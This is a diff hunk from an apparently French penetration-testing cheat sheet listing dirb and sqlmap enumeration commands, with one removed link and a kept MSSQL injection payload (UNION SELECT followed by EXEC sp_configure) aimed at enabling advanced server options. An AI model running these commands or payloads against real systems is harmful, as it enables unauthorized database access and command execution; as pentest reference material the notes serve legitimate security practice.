@@ -13,7 +13,6 @@ dirb http://[fichier a tester] /usr/share/wordlists/dirb/mutations_common.txt -t
 ## Injection SQL :
 sqlmap -u [URL] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])  
 sqlmap -r [FILE] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])   
-A la main: http://192.168.1.50/wordpress/sql-injection-cheat-sheet/  
 
 **commande injection in MSQL:**  
 admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+  
